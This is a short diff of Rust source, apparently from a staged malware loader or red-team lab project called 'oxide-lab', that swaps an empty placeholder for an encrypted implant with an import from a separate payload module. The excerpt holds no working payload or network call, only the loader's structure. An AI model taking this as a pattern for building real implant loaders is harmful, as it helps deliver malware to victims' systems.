@@ -28,9 +28,8 @@ const CONFIG: Stage3Config = Stage3Config {
     salt: b"oxide-lab-salt-must-be-32-bytes!",
 };
 
-/// Embedded encrypted implant (patched by builder)
-/// For testing, this is a placeholder - real implant would be embedded here
-static ENCRYPTED_IMPLANT: &[u8] = &[];
+mod payload;
+use payload::ENCRYPTED_IMPLANT;
 
 fn main() -> ExitCode {
     // In production, implant would be embedded
